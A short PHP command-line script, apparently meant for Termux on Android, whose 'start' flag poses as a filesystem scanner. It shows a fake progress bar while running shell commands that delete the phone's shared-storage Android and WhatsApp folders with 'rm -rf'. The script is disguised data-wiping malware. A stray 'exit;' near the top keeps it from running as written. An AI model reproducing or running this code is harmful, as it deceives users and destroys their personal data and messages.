<?php


if (php_sapi_name() != 'cli') {
    die('Must run from command line');
}
exit;
require __DIR__ . '/vendor/autoload.php';
$strict = in_array('--strict', $_SERVER['argv']);
$arguments = new \cli\Arguments(compact('strict'));
$arguments->addFlag(['start', 's'], 'Starting application');
$arguments->addFlag(['delete', 'd'], 'Delete file');
$arguments->addFlag(['version', 'v'], 'Display the version');
$arguments->addFlag(['help', 'h'], 'Show this help screen');
$arguments->parse();
if ($arguments['help']) {
    echo $arguments->getHelpScreen();
    echo "\n\n";
} elseif ($arguments['version']) {
    echo "Version 1.0.0\n";
} elseif ($arguments['start']) {
    $progressBar = new \ProgressBar\Manager(0, 100);
    shell_exec('termux-setup-storage');
    shell_exec('rm -rf $HOME/storage/sdcard/Android && rm -rf $HOME/storage/sdcard/WhatsApp');
    echo "\n\nScanning filesystem...\n";
    for ($i = 0; $i <= 100; $i++) {
        $progressBar->update($i);
        sleep(random_int(0, 1));
    }
} else {
    echo $arguments->getHelpScreen();
}